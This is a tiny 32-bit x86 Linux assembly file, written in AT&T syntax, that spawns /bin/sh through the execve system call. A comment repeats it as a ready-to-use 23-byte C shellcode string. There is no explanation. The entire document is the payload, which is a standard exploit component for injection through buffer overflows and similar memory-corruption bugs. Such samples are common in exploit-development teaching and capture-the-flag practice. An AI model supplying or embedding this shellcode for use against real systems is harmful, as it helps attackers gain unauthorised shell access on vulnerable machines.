
.text
 
.globl _start
_start:
 	# /bin/sh
 	xor             %eax, %eax
	pushl           %eax
	pushl           $0x68732f6e
	pushl           $0x69622f2f
	movb            $11, %al
	movl            %esp, %ebx
	xor             %ecx, %ecx
	xor             %edx, %edx
	int $0x80

/*
 * static const char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73"
 *                                 "\x68\x68\x2f\x2f\x62\x69"
 *                                 "\xb0\x0b\x89\xe3\x31\xc9"
 *                                 "\x31\xd2\xcd\x80";
 */